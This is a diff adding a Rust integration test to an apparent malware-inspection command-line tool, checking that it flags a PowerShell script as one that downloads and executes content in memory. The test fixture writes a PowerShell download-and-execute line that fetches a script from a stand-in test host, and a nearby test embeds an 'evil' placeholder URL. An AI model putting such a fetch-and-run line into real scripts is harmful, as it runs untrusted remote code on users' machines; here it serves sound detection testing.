@@ -65,6 +65,27 @@ fn dotnet_metadata_of_a_framework_assembly() {
 }
 
 #[test]
+fn script_files_report_high_signal_behaviors() {
+    let path = temp_fixture("dropper.ps1");
+    std::fs::write(
+        &path,
+        "IEX (New-Object Net.WebClient).DownloadString('http://x.example.test/a.ps1')\n",
+    )
+    .expect("write script");
+    let mut command = Command::cargo_bin("banshee").expect("binary");
+    command
+        .args(["file", "inspect"])
+        .arg(&path)
+        .assert()
+        .success()
+        .stdout(predicate::str::contains("Format: PowerShell script"))
+        .stdout(predicate::str::contains(
+            "downloads content and executes it in memory",
+        ));
+    std::fs::remove_file(path).expect("remove script");
+}
+
+#[test]
 fn strings_lists_ascii_and_utf16_with_offsets() {
     let path = temp_fixture("strings.bin");
     let mut data = b"\x00\x01http://evil.example.test/a\x00\xff".to_vec();
